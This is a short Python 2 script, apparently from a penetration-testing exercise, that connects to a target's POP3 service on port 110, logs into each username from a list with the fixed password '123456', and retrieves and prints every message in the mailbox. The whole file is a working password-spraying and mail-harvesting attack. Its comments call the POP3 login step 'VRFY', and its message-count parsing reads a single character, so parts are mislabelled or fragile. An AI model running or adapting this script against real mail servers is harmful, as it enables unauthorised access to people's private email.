#!/usr/bin/python

import socket
import time
import sys

if len(sys.argv) != 2:

	print "Usage: vrfy.py <ip>"

	sys.exit(0)

with open('users.txt', 'r') as reader:
	# Read and print the entire file line by line
	line = reader.readline()

	while line != '':  # The EOF char is an empty string
		
		print("MailBox: "+ line)

		# Create a Socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		# Connect to the Server
		connect = s.connect((sys.argv[1],110))

		# Receive the banner
		banner = s.recv(2048)
		# print banner

		# VRFY a user
		s.send('user ' + line.replace('\n','') + '\r\n')
		result = s.recv(2048)
		# print result

		s.send('pass 123456\r\n')
		result = s.recv(2048)
		# print result

		s.send('list\r\n')
		result = s.recv(2048)
		# print result[4]

		for i in range(int(result[4])):
			print "Mail: " + str(i+1)

			s.send('retr ' + str(i+1) + '\r\n')
			time.sleep(2)

			mail = s.recv(2048)
			print mail


		# Close the socket
		s.close()

		line = reader.readline()